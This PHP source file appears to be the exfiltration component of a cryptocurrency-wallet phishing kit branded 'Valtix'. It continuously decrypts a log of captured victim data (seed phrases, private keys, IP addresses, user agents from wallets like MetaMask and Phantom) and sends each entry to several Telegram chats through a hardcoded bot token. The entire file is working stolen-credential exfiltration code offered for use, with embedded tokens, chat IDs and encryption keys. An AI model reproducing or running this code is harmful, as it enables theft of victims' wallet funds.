<?php
/**
 * telegram_sender.php - Background process that reads capture logs
 * and sends each new entry to Telegram exactly once.
 * Runs continuously via start.sh.
 */

$LOG_FILE       = __DIR__ . '/logs/captures.log';
$SENT_FILE      = __DIR__ . '/logs/sent_tg.log';
$ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';
$ENCRYPTION_IV  = '1234567890abcdef';
$BOT_TOKEN      = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$CHAT_IDS       = [
    getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
    '8955126022',
    '8895304810'
];

// Ensure sent log exists
if (!file_exists($SENT_FILE)) {
    file_put_contents($SENT_FILE, '');
}

// Wallet emoji map for nice Telegram display
$walletEmoji = [
    'phantom'     => '👻 Phantom',
    'metamask'    => '🦊 MetaMask',
    'trustwallet' => '💙 Trust Wallet',
    'solflare'    => '☀️ Solflare',
    'coinbase'    => '🔵 Coinbase',
    'backpack'    => '🎒 Backpack',
    'okx'         => '🔶 OKX',
    'rabby'       => '🐰 Rabby',
];

echo "[Telegram Sender] Started. Watching: $LOG_FILE\n";

while (true) {
    if (!file_exists($LOG_FILE)) {
        sleep(3);
        continue;
    }

    $lines     = file($LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $sentLines = file($SENT_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

    foreach ($lines as $lineIndex => $rawLine) {
        $lineHash = md5($rawLine);

        // Skip if already sent
        if (in_array($lineHash, $sentLines)) {
            continue;
        }

        // Decrypt
        $decrypted = openssl_decrypt(
            base64_decode($rawLine),
            'aes-256-cbc',
            $ENCRYPTION_KEY,
            0,
            $ENCRYPTION_IV
        );

        if (!$decrypted) {
            echo "[!] Failed to decrypt line $lineIndex\n";
            continue;
        }

        $data = json_decode($decrypted, true);
        if (!$data) {
            echo "[!] Failed to decode JSON at line $lineIndex\n";
            continue;
        }

        // ---- Extract fields (handle both short and long field names) ----
        $walletKey   = strtolower($data['wallet'] ?? '');
        $walletName  = $data['walletName'] ?? '';
        $seed        = $data['seed'] ?? $data['seedPhrase'] ?? $data['recoveryPhrase'] ?? '';
        $pkey        = $data['pkey'] ?? $data['privateKey'] ?? $data['private_key'] ?? '';
        $time        = $data['timestamp'] ?? $data['capturedAt'] ?? date('Y-m-d H:i:s');
        $ip          = $data['ip'] ?? $data['IP'] ?? 'Unknown';
        $id          = $data['id'] ?? substr(md5($seed . $pkey . $time), 0, 8);
        $ua          = $data['userAgent'] ?? '';
        $screen      = $data['screenSize'] ?? '';

        // Build nice wallet label
        $walletLabel = $walletEmoji[$walletKey] ?? (!empty($walletName) ? "👛 $walletName" : '👛 Unknown');

        // Clean up seed for display
        $seedDisplay = !empty($seed) ? $seed : '❌ None';
        $pkeyDisplay = !empty($pkey) ? $pkey : '❌ None';

        // Count seed words if present
        $wordCount = !empty($seed) ? count(explode(' ', trim($seed))) : 0;

        // ---- Build Telegram Message ----
        $message = "🚨 Valtix — New Capture 🚨\n";
        $message .= "━━━━━━━━━━━━━━━━━━\n";
        $message .= "💰 Wallet: {$walletLabel}\n";
        $message .= "🆔 ID: {$id}\n";
        $message .= "📅 Time: {$time}\n";
        $message .= "🌐 IP: {$ip}\n";
        $message .= "━━━━━━━━━━━━━━━━━━\n";

        if (!empty($seed)) {
            $message .= "📝 Seed Phrase ({$wordCount} words):\n`{$seed}`\n";
        } else {
            $message .= "📝 Seed: ❌ None\n";
        }

        $message .= "\n";

        if (!empty($pkey)) {
            $message .= "🔑 Private Key:\n`{$pkey}`\n";
        } else {
            $message .= "🔑 Private Key: ❌ None\n";
        }

        $message .= "━━━━━━━━━━━━━━━━━━\n";

        if (!empty($screen)) {
            $message .= "📱 Screen: {$screen}\n";
        }
        if (!empty($ua)) {
            $message .= "💻 UA: " . substr($ua, 0, 60) . "\n";
        }

        $message .= "━━━━━━━━━━━━━━━━━━\n";
        $message .= "⚡ Valtix Intelligence";

        // ---- Send to all chat IDs ----
        $sentOk = true;
        foreach ($CHAT_IDS as $chatId) {
            $chatId = trim($chatId);
            if (empty($chatId)) continue;

            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL            => "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage",
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => json_encode([
                    'chat_id'    => $chatId,
                    'text'       => $message,
                    'parse_mode' => 'Markdown',
                ]),
                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 10,
            ]);
            $resp = curl_exec($ch);
            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($http !== 200) {
                echo "[!] Telegram send to {$chatId} failed (HTTP {$http}): " . substr($resp, 0, 200) . "\n";
                $sentOk = false;
            } else {
                echo "[✓] Sent to {$chatId} — wallet: {$walletLabel}, seed: " . (!empty($seed) ? 'YES' : 'NO') . ", key: " . (!empty($pkey) ? 'YES' : 'NO') . "\n";
            }
        }

        // Mark as sent regardless (don't resend failed ones to avoid spam)
        file_put_contents($SENT_FILE, $lineHash . "\n", FILE_APPEND);
    }

    sleep(5); // Check every 5 seconds
}
